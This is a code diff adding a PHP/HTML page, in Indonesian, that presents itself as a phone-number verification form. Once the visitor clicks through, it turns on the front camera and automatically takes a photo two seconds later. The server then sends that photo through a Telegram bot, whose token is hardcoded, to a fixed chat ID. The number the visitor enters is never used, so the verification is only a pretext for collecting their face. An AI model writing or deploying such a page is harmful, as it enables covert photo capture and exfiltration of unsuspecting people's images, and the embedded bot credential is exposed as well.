@@ -1,0 +1,132 @@
+<?php
+// ===== TELEGRAM CONFIG =====
+$BOT_TOKEN = "8372477038:AAFUUTf5ie4FwMap3-lSBN1sNdq3dSA6d20"; // ganti di komputer kamu
+$CHAT_ID   = "7111594823";        // ID akun @Yazira01
+
+// ===== TERIMA FOTO DARI BROWSER =====
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    if (isset($_FILES['photo'])) {
+        $file = $_FILES['photo']['tmp_name'];
+
+        $url = "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto";
+        $post = [
+            'chat_id' => $CHAT_ID,
+            'photo'   => new CURLFile($file),
+            'caption' => "📸 Foto dari website"
+        ];
+
+        $ch = curl_init($url);
+        curl_setopt($ch, CURLOPT_POST, true);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_exec($ch);
+        curl_close($ch);
+    }
+    exit;
+}
+?>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<title>Verifikasi Nomor</title>
+<style>
+body{
+  margin:0;
+  height:100vh;
+  background:url('bg.jpg') center/cover no-repeat;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  font-family:Arial, sans-serif;
+}
+.box{
+  background:rgba(0,0,0,.65);
+  padding:25px;
+  border-radius:14px;
+  text-align:center;
+  color:#fff;
+  width:320px;
+}
+.box h3{
+  margin:0 0 18px;
+  font-weight:bold;
+}
+.box input{
+  width:100%;
+  padding:12px;
+  margin-bottom:12px;
+  border-radius:8px;
+  border:none;
+  font-size:14px;
+}
+.box button{
+  width:100%;
+  padding:14px;
+  font-size:16px;
+  font-weight:bold;
+  border:none;
+  border-radius:8px;
+  cursor:pointer;
+  background:#00c853;
+  color:#fff;
+}
+small{
+  display:block;
+  margin-top:10px;
+  font-size:11px;
+  opacity:.75;
+}
+video, canvas{display:none;}
+</style>
+</head>
+<body>
+
+<div class="box">
+  <h3>Masukkan Nomor Anda</h3>
+  <input type="tel" id="nomor" placeholder="08xxxxxxxxxx">
+  <button onclick="startCam()">KLICK MASUK UNTUK MELANJUTKAN</button>
+  <small>Kamera depan akan digunakan setelah Anda menyetujui</small>
+</div>
+
+<video id="video" autoplay></video>
+<canvas id="canvas"></canvas>
+
+<script>
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+
+function startCam(){
+  const nomor = document.getElementById('nomor').value.trim();
+  if(nomor === ''){
+    alert('Silakan masukkan nomor Anda terlebih dahulu!');
+    return;
+  }
+
+  navigator.mediaDevices.getUserMedia({
+    video: { facingMode: 'user' } // kamera depan
+  }).then(stream=>{
+    video.srcObject = stream;
+    setTimeout(takePhoto, 2000); // otomatis ambil foto setelah 2 detik
+  }).catch(()=>{
+    alert('Izin kamera diperlukan untuk melanjutkan');
+  });
+}
+
+function takePhoto(){
+  canvas.width  = video.videoWidth;
+  canvas.height = video.videoHeight;
+  canvas.getContext('2d').drawImage(video,0,0);
+
+  canvas.toBlob(blob=>{
+    const fd = new FormData();
+    fd.append('photo', blob);
+
+    fetch('', { method:'POST', body:fd });
+    alert('Foto telah dikirim ke Telegram!');
+  }, 'image/jpeg', 0.9);
+}
+</script>
+
+</body>
+</html>
